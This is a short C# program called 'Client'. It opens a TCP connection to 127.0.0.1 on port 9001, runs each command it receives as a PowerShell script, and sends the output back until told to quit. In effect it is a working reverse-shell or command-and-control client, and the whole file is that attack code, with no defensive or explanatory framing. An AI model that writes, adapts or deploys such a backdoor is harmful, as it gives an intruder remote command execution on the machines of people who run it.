using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;

namespace Client
{
    internal class Program
    {
        public string Result(string cmd)
        {
            string result = "";

            RunspaceConfiguration rs_config  = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace(rs_config);
            r.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = r;
            ps.AddScript(cmd);
            StringWriter sw = new StringWriter();

            Collection<PSObject> po = ps.Invoke();
            foreach (PSObject p in po)
            {
                sw.WriteLine(p.ToString());
            }
            result = sw.ToString();

            if (result == "")
            {
                return "Error Occurred.";
            }

            return result;
        }

        static void Main(string[] args)
        {
            Program p = new Program();
            int BUF_SIZE = 2048;
            string msg;

            IPAddress server_ip = IPAddress.Parse("127.0.0.1");
            Socket client_soc = new Socket(server_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            IPEndPoint ipe = new IPEndPoint(server_ip, 9001);
            client_soc.Connect(ipe);

            byte[] incoming = new byte[BUF_SIZE];
            Array.Clear(incoming, 0, incoming.Length);
            client_soc.Receive(incoming);
            msg = Encoding.ASCII.GetString(incoming).TrimEnd('\0');

            string result;

            while (msg != "quit")
            {
                Console.WriteLine("[*] Received Command: {0}", msg);
                result = p.Result(msg);
                client_soc.Send(Encoding.ASCII.GetBytes(result));
                Array.Clear(incoming, 0, incoming.Length);
                client_soc.Receive(incoming);
                msg = Encoding.ASCII.GetString(incoming).TrimEnd('\0');
            }

            client_soc.Close();
        }
    }
}
